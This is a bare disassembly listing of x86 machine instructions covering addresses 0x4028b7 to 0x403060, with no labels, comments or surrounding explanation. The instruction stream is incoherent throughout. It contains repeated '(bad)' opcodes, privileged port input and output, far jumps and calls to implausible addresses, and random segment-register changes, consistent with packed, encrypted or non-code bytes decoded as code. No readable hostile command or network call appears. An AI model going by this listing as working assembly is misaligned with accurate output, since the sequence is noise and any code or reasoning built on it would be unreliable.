  4028b7:	add    al,BYTE PTR [ebp-0x4bfe27cb]
  4028bd:	out    0x8,eax
  4028bf:	mov    eax,0x5b0ce33d
  4028c4:	in     eax,dx
  4028c5:	mov    bl,0xb8
  4028c7:	xor    al,BYTE PTR [ebx+0x65]
  4028ca:	ror    BYTE PTR [edi+0x3da7f145],0x7b
  4028d1:	fwait
  4028d2:	push   ds
  4028d3:	cli    
  4028d4:	pop    es
  4028d5:	scas   eax,DWORD PTR es:[edi]
  4028d6:	scas   al,BYTE PTR es:[edi]
  4028d7:	(bad)  
  4028d8:	xchg   DWORD PTR [ecx],eax
  4028da:	jle    0x402890
  4028dc:	cli    
  4028dd:	xchg   edx,eax
  4028de:	push   0x30
  4028e0:	cwde   
  4028e1:	or     DWORD PTR [edx-0x9],ecx
  4028e4:	push   ecx
  4028e5:	lock adc DWORD PTR [eax],ecx
  4028e8:	lahf   
  4028e9:	test   DWORD PTR ds:0x762cc3ea,eax
  4028ef:	(bad)  
  4028f0:	jo     0x4028a4
  4028f2:	push   edi
  4028f3:	jnp    0x402937
  4028f5:	ja     0x402975
  4028f7:	jmp    0x40292e
  4028f9:	aam    0x20
  4028fb:	mov    al,0x16
  4028fd:	jl     0x4028e2
  4028ff:	out    dx,al
  402900:	push   0xffffffaf
  402902:	bound  ecx,QWORD PTR [eax+0x3d9c18d4]
  402908:	popf   
  402909:	shl    BYTE PTR [esi],0x6
  40290c:	fsub   DWORD PTR [ecx-0x46edfc95]
  402912:	mov    ebp,0xfb90861c
  402917:	jle    0x402934
  402919:	xor    al,0xdc
  40291b:	repnz out 0xad,al
  40291e:	aam    0x36
  402920:	inc    ecx
  402921:	daa    
  402922:	mov    dl,0xcb
  402924:	mov    bh,0xb9
  402926:	sar    DWORD PTR ds:0xe2c07a69,0x85
  40292d:	mov    dh,0x26
  40292f:	shl    BYTE PTR [ebx+ebx*8+0x4c],cl
  402933:	fs jmp 0xb1d7:0xe488536e
  40293b:	jmp    0xc1363fa6
  402940:	sbb    DWORD PTR [esi+0xd1c997d],esi
  402946:	inc    edx
  402947:	lods   eax,DWORD PTR ds:[esi]
  402948:	fucomip st,st(0)
  40294a:	xor    DWORD PTR [eax+0x4a],edi
  40294d:	xchg   ecx,eax
  40294e:	push   edx
  40294f:	sbb    ch,BYTE PTR [ecx]
  402951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402952:	inc    esi
  402953:	add    BYTE PTR [edi+0x15ab5ce8],dl
  402959:	stc    
  40295a:	aaa    
  40295b:	add    eax,0x52139821
  402960:	fbld   TBYTE PTR ds:0x205d97a9
  402966:	mov    eax,0xed11b68e
  40296b:	test   eax,0xa9fa1956
  402970:	fisttp DWORD PTR [esi+0x28]
  402973:	ins    BYTE PTR es:[edi],dx
  402974:	jno    0x4029c2
  402976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402977:	retf   
  402978:	sub    DWORD PTR [esi+0x32b9e7a2],esp
  40297e:	cs adc bh,al
  402981:	cdq    
  402982:	fsubr  DWORD PTR [edi+0x5a]
  402985:	sbb    al,0xf6
  402987:	mov    ecx,eax
  402989:	mov    esp,0x569b85de
  40298e:	adc    cl,BYTE PTR [eax-0x42]
  402991:	push   0xffffffb6
  402993:	sub    al,0xe1
  402995:	outs   dx,DWORD PTR ds:[esi]
  402996:	cmp    al,bh
  402998:	xchg   dl,dh
  40299a:	jo     0x40298f
  40299c:	rcr    BYTE PTR [eax+edi*8-0x1b],cl
  4029a0:	mov    ch,0x47
  4029a2:	xchg   ecx,eax
  4029a3:	mov    ds,WORD PTR [ecx-0x237ec054]
  4029a9:	lods   al,BYTE PTR ds:[esi]
  4029aa:	jmp    0x4029a9
  4029ac:	sahf   
  4029ad:	jo     0x4029fa
  4029af:	fdivr  QWORD PTR [edi+0x2d]
  4029b2:	pop    es
  4029b3:	aaa    
  4029b4:	mov    fs,WORD PTR [edi]
  4029b6:	aaa    
  4029b7:	(bad)  
  4029b8:	std    
  4029b9:	(bad)  
  4029ba:	jnp    0x4029aa
  4029bc:	les    eax,FWORD PTR [eax+0x7c]
  4029bf:	inc    edi
  4029c0:	rcr    BYTE PTR [ecx],1
  4029c2:	outs   dx,DWORD PTR ds:[esi]
  4029c3:	pop    es
  4029c4:	dec    ebp
  4029c5:	cmp    BYTE PTR [edx-0x4a2995b4],0x5d
  4029cc:	mov    WORD PTR [edi+eiz*4],?
  4029cf:	jmp    0x40298b
  4029d1:	in     eax,dx
  4029d2:	pop    ds
  4029d3:	xor    eax,eax
  4029d5:	jge    0x4029f5
  4029d7:	push   cs
  4029d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029d9:	fwait
  4029da:	add    dh,BYTE PTR [ebp+0x76]
  4029dd:	call   DWORD PTR [ebp-0x35a381ca]
  4029e3:	int3   
  4029e4:	loop   0x4029c0
  4029e6:	lds    edi,FWORD PTR [edi-0x13ab4ae7]
  4029ec:	imul   esi,DWORD PTR [edi],0xd1855157
  4029f2:	ins    BYTE PTR es:[edi],dx
  4029f3:	test   al,0x72
  4029f5:	adc    ebp,edx
  4029f7:	mov    ebx,0x6a250c52
  4029fc:	outs   dx,DWORD PTR ds:[esi]
  4029fd:	cdq    
  4029fe:	add    ebp,edx
  402a00:	xor    DWORD PTR [ecx+0x61],esp
  402a03:	call   0x14dc5d0e
  402a08:	sbb    eax,esi
  402a0a:	add    dh,BYTE PTR [ebx]
  402a0c:	push   eax
  402a0d:	fs dec ebp
  402a0f:	not    ecx
  402a11:	sti    
  402a12:	pop    esp
  402a13:	jns    0x402a48
  402a15:	jae    0x402a87
  402a17:	xchg   ebp,eax
  402a18:	push   edi
  402a19:	(bad)  
  402a1a:	idiv   DWORD PTR [edx-0x3f]
  402a1d:	gs fwait
  402a1f:	push   edx
  402a20:	icebp  
  402a21:	push   esi
  402a22:	fcmovb st,st(4)
  402a24:	lahf   
  402a25:	mov    ?,WORD PTR [eax-0x41]
  402a28:	jne    0x402a43
  402a2a:	outs   dx,DWORD PTR ds:[esi]
  402a2b:	jg     0x402a09
  402a2d:	add    BYTE PTR [esi-0x6],ah
  402a30:	dec    eax
  402a31:	and    edi,esi
  402a33:	jnp    0x402a16
  402a35:	test   al,0x7a
  402a37:	mov    ds:0xf087772e,eax
  402a3c:	push   ss
  402a3d:	mov    edi,0xc3575d08
  402a42:	popa   
  402a43:	inc    ebp
  402a44:	push   0xa46b0b4b
  402a49:	call   0xe48c5735
  402a4e:	ds mov edx,esp
  402a51:	lock sbb eax,0x114dfcc5
  402a57:	fdiv   st,st(7)
  402a59:	retf   0xa641
  402a5c:	scas   al,BYTE PTR es:[edi]
  402a5d:	jnp    0x402a23
  402a5f:	mov    edi,0xc9e2e64c
  402a64:	test   eax,0x965309dc
  402a69:	mov    eax,0xbea3d139
  402a6e:	xlat   BYTE PTR ds:[ebx]
  402a6f:	cmp    DWORD PTR [esi+0x770cd008],0xf9b1e56a
  402a79:	je     0x402a53
  402a7b:	add    al,0x7
  402a7d:	push   eax
  402a7e:	sbb    eax,0xa49bd3ab
  402a83:	mov    dh,0x62
  402a85:	add    bl,BYTE PTR [esi]
  402a87:	(bad)  
  402a88:	push   edi
  402a89:	in     al,dx
  402a8a:	out    0xd9,eax
  402a8c:	popa   
  402a8d:	pop    edx
  402a8e:	shr    cl,1
  402a90:	lds    edi,FWORD PTR [ebp-0x1ab7928d]
  402a96:	daa    
  402a97:	and    ecx,DWORD PTR [ecx-0x9b8716c]
  402a9d:	xlat   BYTE PTR ds:[ebx]
  402a9e:	sub    eax,0x6e181bc7
  402aa3:	ja     0x402a8c
  402aa5:	leave  
  402aa6:	push   ss
  402aa7:	xor    BYTE PTR [ecx],0x4d
  402aaa:	outs   dx,BYTE PTR ds:[esi]
  402aab:	add    edi,esi
  402aad:	aaa    
  402aae:	or     BYTE PTR [eax-0xb],0xa9
  402ab2:	ds or  eax,0x1c4feb80
  402ab8:	repnz cmp dh,BYTE PTR [esi+edx*8]
  402abc:	add    ah,dl
  402abe:	jl     0x402a8e
  402ac0:	xlat   BYTE PTR ds:[ebx]
  402ac1:	mov    edx,0xbc89c3ee
  402ac6:	jg     0x402a93
  402ac8:	call   0x5b84e46b
  402acd:	(bad)  [edi-0x45f20d38]
  402ad3:	sbb    esi,DWORD PTR [eax]
  402ad5:	sti    
  402ad6:	mov    ecx,0x940c21ac
  402adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402adc:	test   bh,bl
  402ade:	in     al,dx
  402adf:	ret    
  402ae0:	mov    BYTE PTR [ebp-0x58b919b6],ch
  402ae6:	(bad)  
  402ae8:	in     eax,0x13
  402aea:	fimul  DWORD PTR [edi+0x4]
  402aed:	jmp    0x443e302a
  402af2:	not    eax
  402af4:	pop    ss
  402af5:	pop    ebp
  402af6:	mov    bh,0x7c
  402af8:	jmp    0x402a84
  402afa:	aam    0x16
  402afc:	dec    edi
  402afd:	fidiv  WORD PTR [ebp+0x10116e1]
  402b03:	rol    DWORD PTR [esi+eax*8-0x41125a3f],1
  402b0a:	xchg   edi,eax
  402b0b:	jnp    0x402b77
  402b0d:	add    BYTE PTR [ebp-0x705de40f],dh
  402b13:	cmp    al,0xf
  402b15:	div    DWORD PTR [esi+0x16]
  402b18:	xor    eax,0xf0bf78f
  402b1d:	mov    ds:0xc3e72c49,al
  402b22:	(bad)  [ebx+ebp*1+0x7c]
  402b26:	sbb    eax,0x66f00f4b
  402b2b:	fld    TBYTE PTR [edx]
  402b2d:	inc    esp
  402b2e:	lods   ax,WORD PTR ds:[esi]
  402b30:	jl     0x402afe
  402b32:	pop    ss
  402b33:	dec    edi
  402b34:	retf   
  402b35:	push   esp
  402b36:	ds jmp 0x402b91
  402b39:	and    esi,DWORD PTR [edi+0x334916c6]
  402b3f:	xchg   edx,eax
  402b40:	pushf  
  402b41:	or     ebx,DWORD PTR [edi+0x7e]
  402b44:	xchg   DWORD PTR [esi-0x77],eax
  402b47:	ds es jb 0x402b1f
  402b4b:	enter  0x72c3,0x2c
  402b4f:	mul    DWORD PTR [esp]
  402b52:	xor    bh,BYTE PTR [ecx+edi*1-0x25]
  402b56:	mov    esi,0xd161b0c5
  402b5b:	fst    QWORD PTR [ecx]
  402b5d:	cli    
  402b5e:	add    al,0xa5
  402b60:	mov    esp,0xb46f1ce4
  402b65:	cmp    eax,0x7b03a205
  402b6a:	scas   eax,DWORD PTR es:[edi]
  402b6b:	call   0xde3093c
  402b70:	nop
  402b71:	pop    esi
  402b72:	pop    es
  402b73:	pop    es
  402b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b75:	pop    ss
  402b76:	cdq    
  402b77:	ins    BYTE PTR es:[edi],dx
  402b78:	mov    dl,0x7b
  402b7a:	pop    edi
  402b7b:	sar    esp,cl
  402b7d:	fsubr  QWORD PTR [ecx+ecx*2-0x4ac19066]
  402b84:	ds adc eax,0x442a75fe
  402b8a:	push   esi
  402b8b:	mov    cl,0xcf
  402b8d:	xchg   esi,eax
  402b8e:	mov    al,ds:0x1197a18f
  402b93:	in     al,dx
  402b94:	mov    esi,0x18314cfd
  402b99:	xchg   ebp,eax
  402b9a:	dec    esi
  402b9b:	test   BYTE PTR [edi+edi*2+0xbcf5769],ch
  402ba2:	shl    BYTE PTR [esi+0x3ff42e50],1
  402ba8:	stos   BYTE PTR es:[edi],al
  402ba9:	push   0xffffffbb
  402bab:	inc    ecx
  402bac:	in     al,dx
  402bad:	add    eax,0x28c5e292
  402bb2:	mov    ebx,esp
  402bb4:	call   0x6ad4:0xaca87eb1
  402bbb:	and    al,BYTE PTR [ebx]
  402bbd:	push   eax
  402bbe:	mov    esp,0x5219a96c
  402bc3:	dec    eax
  402bc4:	sub    eax,0x1b1a71e
  402bc9:	dec    ebx
  402bca:	mov    ecx,0x373078a6
  402bcf:	mov    dh,0x5b
  402bd1:	pop    edi
  402bd2:	cdq    
  402bd3:	cs pop ds
  402bd5:	lods   eax,DWORD PTR ds:[esi]
  402bd6:	js     0x402b7a
  402bd8:	and    ebp,ebx
  402bda:	jo     0x402be3
  402bdc:	int    0x16
  402bde:	push   es
  402bdf:	aas    
  402be0:	pop    ebx
  402be1:	pop    ebp
  402be2:	mov    edi,0xe31c8c8a
  402be7:	dec    esi
  402be8:	xor    eax,0x7b062d63
  402bed:	and    eax,0x8ec91524
  402bf2:	loope  0x402c60
  402bf4:	xchg   DWORD PTR [esi+edx*2-0x1b],edx
  402bf8:	sbb    al,0x74
  402bfa:	add    al,0xc5
  402bfc:	pusha  
  402bfd:	xchg   edx,eax
  402bfe:	ror    ch,cl
  402c00:	jae    0x402bd2
  402c02:	push   DWORD PTR [edx-0x2b]
  402c05:	jmp    DWORD PTR [esi+0x423fd815]
  402c0b:	sub    eax,0xbc9518ca
  402c10:	clc    
  402c11:	in     al,dx
  402c12:	jns    0x402be3
  402c14:	dec    edi
  402c15:	mov    ebp,0xd8024db8
  402c1a:	enter  0x540c,0x87
  402c1e:	ja     0x402bb0
  402c20:	repnz ins BYTE PTR es:[edi],dx
  402c22:	mov    eax,0xcee04eb4
  402c27:	push   eax
  402c28:	test   BYTE PTR ds:0x6155f177,al
  402c2e:	cwde   
  402c2f:	or     edx,DWORD PTR [esi]
  402c31:	or     eax,0xc128af54
  402c36:	jno    0x402cb1
  402c38:	inc    esi
  402c39:	pop    edi
  402c3a:	sbb    BYTE PTR [edx+0x6],bh
  402c3d:	mov    BYTE PTR [esi-0xfb10ac8],dh
  402c43:	inc    ecx
  402c44:	mov    esi,0x2790f4d2
  402c49:	shr    BYTE PTR [ecx-0x4c80688e],1
  402c4f:	lods   eax,DWORD PTR ds:[esi]
  402c50:	aad    0xd
  402c52:	mov    cs:0x32eac388,eax
  402c58:	push   0x4b83071e
  402c5d:	sbb    eax,DWORD PTR [esi]
  402c5f:	and    DWORD PTR [ecx],esi
  402c61:	ss push 0xffffffad
  402c64:	pop    ebp
  402c65:	dec    ebx
  402c66:	test   DWORD PTR [ecx],0xd7f29049
  402c6c:	cwde   
  402c6d:	loope  0x402c03
  402c6f:	push   0x15
  402c71:	or     al,0xc2
  402c73:	cmp    dh,BYTE PTR [edi]
  402c75:	xor    bl,BYTE PTR [eax]
  402c77:	ret    0x7c52
  402c7a:	retf   0xad91
  402c7d:	sub    DWORD PTR [eax-0x6a52b0d5],ebx
  402c83:	sbb    DWORD PTR [ecx+ebx*4+0x352693f5],ebp
  402c8a:	fadd   DWORD PTR ss:[edi+0x676e35d8]
  402c91:	aad    0x73
  402c93:	mov    ecx,0x4b8e5eb1
  402c98:	dec    eax
  402c99:	mov    ds:0x7cedaa37,al
  402c9e:	stos   DWORD PTR es:[edi],eax
  402c9f:	enter  0xeff3,0x9f
  402ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ca4:	and    al,0xba
  402ca6:	shl    DWORD PTR [eax+0x57ce187],1
  402cac:	retf   
  402cad:	mov    cl,0x71
  402caf:	inc    esi
  402cb0:	fld    TBYTE PTR [edx+0x43215814]
  402cb6:	outs   dx,BYTE PTR ds:[esi]
  402cb7:	pop    edx
  402cb8:	jg     0x402d1f
  402cba:	mov    ds:0xbc3b059,eax
  402cbf:	lds    eax,FWORD PTR [esp+esi*8]
  402cc2:	sar    BYTE PTR [edi],1
  402cc4:	sub    bh,BYTE PTR [edx+0x29b5e4b1]
  402cca:	inc    ebp
  402ccb:	jno    0x402cd7
  402ccd:	daa    
  402cce:	shl    edx,0x5
  402cd1:	popf   
  402cd2:	jbe    0x402d1c
  402cd4:	test   cl,ah
  402cd6:	dec    eax
  402cd7:	inc    eax
  402cd8:	cwde   
  402cd9:	add    BYTE PTR [esi-0x2a48d182],bh
  402cdf:	add    BYTE PTR [ebp-0x3200b023],dh
  402ce5:	mov    edx,0x8259b89f
  402cea:	popa   
  402ceb:	xlat   BYTE PTR ds:[ebx]
  402cec:	cdq    
  402ced:	popf   
  402cee:	jnp    0x402d16
  402cf0:	repnz pop ebp
  402cf2:	cmp    ch,bl
  402cf4:	hlt    
  402cf5:	jl     0x402c94
  402cf7:	xor    ch,ch
  402cf9:	inc    ecx
  402cfa:	inc    ebp
  402cfb:	scas   al,BYTE PTR es:[edi]
  402cfc:	sbb    ch,BYTE PTR [edx+edx*8-0x7]
  402d00:	sbb    eax,0x93ec04f6
  402d05:	push   es
  402d06:	adc    eax,0xd0af24a7
  402d0b:	mov    ebp,0x69a37816
  402d10:	div    BYTE PTR [ecx+0x2691db83]
  402d16:	jae    0x402cd0
  402d18:	jecxz  0x402ce0
  402d1a:	and    bl,BYTE PTR [ebx+0xf]
  402d1d:	in     eax,dx
  402d1e:	add    esp,esi
  402d20:	cli    
  402d21:	outs   dx,DWORD PTR ds:[esi]
  402d22:	fadd   QWORD PTR [esi-0x2a739a1c]
  402d28:	cmp    bh,ch
  402d2a:	ja     0x402d90
  402d2c:	add    al,0xe8
  402d2e:	sbb    al,0xe5
  402d30:	aad    0x9b
  402d32:	sbb    ah,BYTE PTR [ebx]
  402d34:	push   eax
  402d35:	nop
  402d36:	shl    BYTE PTR [ebx],0x55
  402d39:	or     al,0x82
  402d3b:	mov    eax,ds:0x8f335a7e
  402d40:	push   ds
  402d41:	test   DWORD PTR [ebp-0x4bcc272e],esp
  402d47:	mov    bl,0xbb
  402d49:	push   es
  402d4a:	mov    esp,ebp
  402d4c:	or     eax,0x486e5f3f
  402d51:	mov    DWORD PTR [eax+0x3df619a3],eax
  402d57:	jge    0x402da3
  402d59:	cli    
  402d5a:	ret    0x2cc2
  402d5d:	jne    0x402d12
  402d5f:	push   ebp
  402d60:	dec    edi
  402d61:	js     0x402d8e
  402d63:	sti    
  402d64:	jp     0x402d2d
  402d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d67:	add    BYTE PTR [esi+ebx*4-0xe],ah
  402d6b:	adc    BYTE PTR [ebx],bl
  402d6d:	adc    dl,BYTE PTR [eax]
  402d6f:	outs   dx,DWORD PTR ds:[esi]
  402d70:	inc    edi
  402d71:	push   eax
  402d72:	push   eax
  402d73:	lods   al,BYTE PTR ds:[esi]
  402d74:	ror    ebp,0xf6
  402d77:	cdq    
  402d78:	aad    0x94
  402d7a:	inc    ebp
  402d7b:	fcomp  QWORD PTR [eax]
  402d7d:	in     eax,dx
  402d7e:	cmc    
  402d7f:	lds    ecx,FWORD PTR [ebp-0x68]
  402d82:	jmp    0x402de9
  402d84:	sbb    DWORD PTR [edi-0x256df58b],ebx
  402d8a:	dec    ebx
  402d8b:	push   ecx
  402d8c:	mov    al,ds:0xc701b96d
  402d91:	mov    edi,0x843ddb62
  402d96:	lds    esi,FWORD PTR [edx]
  402d98:	test   al,0x3c
  402d9a:	arpl   WORD PTR [esi+0x58],dx
  402d9d:	enter  0x76f4,0x92
  402da1:	mov    cl,0x5c
  402da3:	cdq    
  402da4:	je     0x402d81
  402da6:	sbb    dl,BYTE PTR [edx+ecx*4-0x3d]
  402daa:	xor    BYTE PTR ds:0x1e2c206b,cl
  402db0:	pushf  
  402db1:	shl    ebx,1
  402db3:	sub    al,0x6d
  402db5:	push   ds
  402db6:	push   es
  402db7:	jl     0x402d4c
  402db9:	mov    bh,0x6c
  402dbb:	cmp    eax,0xd5ffde49
  402dc0:	push   0xffffffed
  402dc2:	das    
  402dc3:	popf   
  402dc4:	inc    ebp
  402dc5:	sbb    edx,DWORD PTR [esi]
  402dc7:	push   cs
  402dc8:	(bad)  
  402dca:	or     ebp,DWORD PTR [ebp+0x73]
  402dcd:	sub    BYTE PTR [esp+edi*8-0x74],bl
  402dd1:	add    BYTE PTR [ecx-0x77],ah
  402dd4:	mov    ch,0x81
  402dd6:	xchg   ebp,eax
  402dd7:	sub    eax,0x38f8e74c
  402ddc:	addr16 jb 0x402dd2
  402ddf:	fild   DWORD PTR [ecx-0x6c6ce835]
  402de5:	je     0x402dc2
  402de7:	nop
  402de8:	in     al,dx
  402de9:	das    
  402dea:	push   0x437002fc
  402def:	out    0xf9,al
  402df1:	xor    dh,al
  402df3:	and    al,BYTE PTR [esi-0x21b5ca01]
  402df9:	mov    bl,0xb4
  402dfb:	dec    esi
  402dfc:	and    al,0xcc
  402dfe:	pop    ebp
  402dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e00:	mov    al,ds:0x8b71a971
  402e05:	jmp    0x402e2f
  402e07:	inc    ecx
  402e08:	popw   es
  402e0a:	out    0x38,al
  402e0c:	sbb    al,0xe4
  402e0e:	mov    ah,0xfe
  402e10:	mul    DWORD PTR [ebp-0x5]
  402e13:	sbb    bh,BYTE PTR [ecx+0x33]
  402e16:	push   0x11
  402e18:	fcmovnu st,st(6)
  402e1a:	jmp    0x1b500bca
  402e1f:	mov    al,BYTE PTR [edi+0x299e55f5]
  402e25:	xchg   ecx,eax
  402e26:	add    bl,al
  402e28:	cdq    
  402e29:	push   ds
  402e2a:	sbb    eax,0x87524bc3
  402e2f:	imul   DWORD PTR [eax]
  402e31:	test   DWORD PTR [ebx-0x4b75ed19],0x7c919de9
  402e3b:	sbb    BYTE PTR [ebp-0x5b],dl
  402e3e:	cmp    DWORD PTR [eax],eax
  402e40:	test   DWORD PTR [edi-0x30df68],0x1227d7fd
  402e4a:	pusha  
  402e4b:	xlat   BYTE PTR ds:[ebx]
  402e4c:	mov    ecx,0x73faae1e
  402e51:	xchg   esp,eax
  402e52:	pushf  
  402e53:	inc    edx
  402e54:	cli    
  402e55:	add    dh,BYTE PTR [ecx+0x1d9e2fe1]
  402e5b:	xchg   ecx,eax
  402e5c:	std    
  402e5d:	and    al,0x8f
  402e5f:	iret   
  402e60:	idiv   DWORD PTR [ebx]
  402e62:	fistp  QWORD PTR [ebx]
  402e64:	das    
  402e65:	call   0x7e851910
  402e6a:	rcl    DWORD PTR [ecx-0x48],0xd8
  402e6e:	or     eax,0x794bafe5
  402e73:	push   DWORD PTR [edi]
  402e75:	sbb    al,0xa5
  402e77:	clc    
  402e78:	push   ebp
  402e79:	jne    0x402e0b
  402e7b:	push   ebx
  402e7c:	repz popf 
  402e7e:	xchg   edi,eax
  402e7f:	xor    ah,ah
  402e81:	dec    edx
  402e82:	out    0x5f,al
  402e84:	mov    WORD PTR [eax],cs
  402e86:	adc    ax,0x712e
  402e8a:	mov    dh,0xe0
  402e8c:	rcl    BYTE PTR [edi],cl
  402e8e:	stos   BYTE PTR es:[edi],al
  402e8f:	jo     0x402ec3
  402e91:	shr    BYTE PTR [edi],1
  402e93:	cmp    eax,0x77110cf
  402e98:	imul   BYTE PTR [esi+0x70c196eb]
  402e9e:	push   cs
  402e9f:	xlat   BYTE PTR ds:[ebx]
  402ea0:	add    al,0xce
  402ea2:	test   DWORD PTR [edi+0x13],ebp
  402ea5:	pop    ebx
  402ea6:	stos   DWORD PTR es:[edi],eax
  402ea7:	repz sti 
  402ea9:	cmp    ebp,DWORD PTR [edx+0x5b134341]
  402eaf:	shr    DWORD PTR [ecx],cl
  402eb1:	int    0x3
  402eb3:	pop    edx
  402eb4:	clc    
  402eb5:	mov    ebx,0x81c22e1a
  402eba:	inc    eax
  402ebb:	fisub  WORD PTR [edx]
  402ebd:	inc    esp
  402ebe:	ins    BYTE PTR es:[edi],dx
  402ebf:	jnp    0x402f2a
  402ec1:	push   eax
  402ec2:	in     eax,dx
  402ec3:	(bad)  
  402ec4:	js     0x402ecb
  402ec6:	inc    eax
  402ec7:	ja     0x402e9d
  402ec9:	xchg   esi,eax
  402eca:	xchg   DWORD PTR [ecx-0x19fe2ace],edi
  402ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed1:	stc    
  402ed2:	xor    al,0x3f
  402ed4:	imul   ecx,DWORD PTR [ecx+ebp*2],0xb57e4a54
  402edb:	cmp    al,0x7e
  402edd:	out    0xcb,eax
  402edf:	iret   
  402ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ee1:	jle    0x402edb
  402ee3:	popa   
  402ee4:	push   edx
  402ee5:	jb     0x402f30
  402ee7:	stc    
  402ee8:	inc    ebx
  402ee9:	mov    ecx,0x64971734
  402eee:	mov    dl,0x52
  402ef0:	inc    edi
  402ef1:	bound  eax,QWORD PTR ds:0x7d10e2b3
  402ef7:	out    0xa1,al
  402ef9:	test   ah,dl
  402efb:	adc    eax,0x372d6e9
  402f00:	push   es
  402f01:	push   edi
  402f02:	(bad)  
  402f03:	(bad)  
  402f04:	sbb    DWORD PTR [ecx],ebx
  402f06:	or     cl,BYTE PTR [esp+eiz*4]
  402f09:	fcomip st,st(0)
  402f0b:	fsubr  DWORD PTR [ecx+eiz*2]
  402f0e:	dec    esi
  402f0f:	(bad)  
  402f10:	mov    al,ds:0x97822efd
  402f15:	mov    bl,0x91
  402f17:	cld    
  402f18:	push   ds
  402f19:	fcmovu st,st(3)
  402f1b:	add    dh,BYTE PTR [edx+edx*1+0x630e5e15]
  402f22:	ins    DWORD PTR es:[edi],dx
  402f23:	xchg   dl,bl
  402f25:	add    BYTE PTR [eax-0x3],al
  402f28:	mov    bh,0xd3
  402f2a:	cmp    eax,0x34bce18c
  402f2f:	pop    ebx
  402f30:	inc    eax
  402f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f32:	adc    BYTE PTR [esp+edx*1],cl
  402f35:	sbb    ebx,edx
  402f37:	xchg   DWORD PTR [eax+ebx*1-0x35ebee9],esp
  402f3e:	sbb    al,BYTE PTR [esi]
  402f40:	mov    ebx,0x512269ad
  402f45:	stc    
  402f46:	cdq    
  402f47:	and    esp,DWORD PTR [ebx-0x5e780b45]
  402f4d:	leave  
  402f4e:	inc    eax
  402f4f:	adc    BYTE PTR [eax-0x3af60e09],dh
  402f55:	(bad)  
  402f57:	fstp   TBYTE PTR [ebp-0x44]
  402f5a:	ror    BYTE PTR [esi-0x3ff986aa],1
  402f60:	test   eax,0xda94418f
  402f65:	push   edx
  402f66:	in     al,0x95
  402f68:	aad    0xf3
  402f6a:	jae    0x402fe9
  402f6c:	mov    WORD PTR [esi],?
  402f6e:	xchg   edi,eax
  402f6f:	dec    esi
  402f70:	das    
  402f71:	imul   eax,ecx,0xffffffaa
  402f74:	mov    esi,0xda5028dd
  402f79:	xchg   esi,eax
  402f7a:	sub    eax,0x4b92ba7e
  402f7f:	mov    edx,0x1e508a2c
  402f84:	and    cl,BYTE PTR [edi+0x56]
  402f87:	and    eax,0xc0552a00
  402f8c:	sub    eax,0xdedc5669
  402f91:	jbe    0x402fb0
  402f93:	add    DWORD PTR [edx-0x14],esi
  402f96:	packsswb mm3,mm4
  402f99:	rcl    BYTE PTR [ecx],0xf1
  402f9c:	jnp    0x402f6c
  402f9e:	icebp  
  402f9f:	ret    
  402fa0:	push   0x4b
  402fa2:	or     bl,BYTE PTR [ecx-0x61]
  402fa5:	rcl    ebp,1
  402fa7:	mov    edi,0xb3661368
  402fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fad:	ins    DWORD PTR es:[edi],dx
  402fae:	pop    eax
  402faf:	mov    ecx,0xc314041c
  402fb4:	jmp    0x85e96eef
  402fb9:	hlt    
  402fba:	imul   eax,DWORD PTR [esi+0x1],0x31
  402fbe:	aaa    
  402fbf:	out    0x30,al
  402fc1:	mov    eax,ds:0x75cf6073
  402fc6:	ja     0x402fbd
  402fc8:	sbb    BYTE PTR [eax+0x8fe2253],al
  402fce:	leave  
  402fcf:	sub    eax,0x6832614e
  402fd4:	pushf  
  402fd5:	mov    DWORD PTR [edi-0x2f],ecx
  402fd8:	inc    ebx
  402fd9:	pop    ebp
  402fda:	sub    dh,BYTE PTR ds:0x2582a30a
  402fe0:	jo     0x403051
  402fe2:	out    dx,al
  402fe3:	cmp    DWORD PTR [edx-0x3645d11f],ecx
  402fe9:	and    eax,0x40eba9cb
  402fee:	inc    eax
  402fef:	cld    
  402ff0:	cmp    eax,0x2fdf2d04
  402ff5:	jg     0x402ff1
  402ff7:	scas   eax,DWORD PTR es:[edi]
  402ff8:	pop    eax
  402ff9:	ins    DWORD PTR es:[edi],dx
  402ffa:	popaw  
  402ffc:	loopne 0x402fd5
  402ffe:	js     0x403058
  403000:	in     eax,dx
  403001:	addr16 faddp st(4),st
  403004:	shl    eax,cl
  403006:	mov    es,WORD PTR [ebp-0x68]
  403009:	jl     0x40302a
  40300b:	push   edi
  40300c:	idiv   BYTE PTR [ebx+0x53]
  40300f:	loop   0x40304d
  403011:	cmc    
  403012:	jae    0x403004
  403014:	dec    ebx
  403015:	(bad)  
  403016:	lahf   
  403017:	out    dx,eax
  403018:	add    BYTE PTR [edi],ah
  40301a:	test   ebp,esp
  40301c:	in     eax,dx
  40301d:	mov    BYTE PTR [ecx],dh
  40301f:	out    dx,al
  403020:	aas    
  403021:	cdq    
  403022:	xor    DWORD PTR [ecx],ebp
  403024:	cmp    BYTE PTR [ecx],bh
  403026:	push   eax
  403027:	nop
  403028:	(bad)  
  403029:	dec    ebx
  40302a:	ja     0x4030a2
  40302c:	rcr    DWORD PTR [ebx+0xf37ccfd],0x5
  403033:	mov    DWORD PTR [eax],edi
  403035:	psllw  mm3,QWORD PTR [ecx+0xb]
  403039:	inc    ebp
  40303a:	jg     0x402fc2
  40303c:	out    0x80,eax
  40303e:	dec    edx
  40303f:	mov    ebp,0x1598a186
  403044:	jno    0x403053
  403046:	je     0x402fda
  403048:	and    eax,DWORD PTR [ebx]
  40304a:	cmp    al,0x36
  40304c:	sbb    bl,0xa9
  40304f:	data16 jae 0x403044
  403052:	jl     0x403072
  403054:	(bad)  
  403055:	or     eax,DWORD PTR [bp+si]
  403058:	sahf   
  403059:	dec    ecx
  40305a:	mov    ebp,0x3b0d0819
  40305f:	retf   
  403060:	repz adc ebp,DWORD PTR [eax+0x7e8745c9]
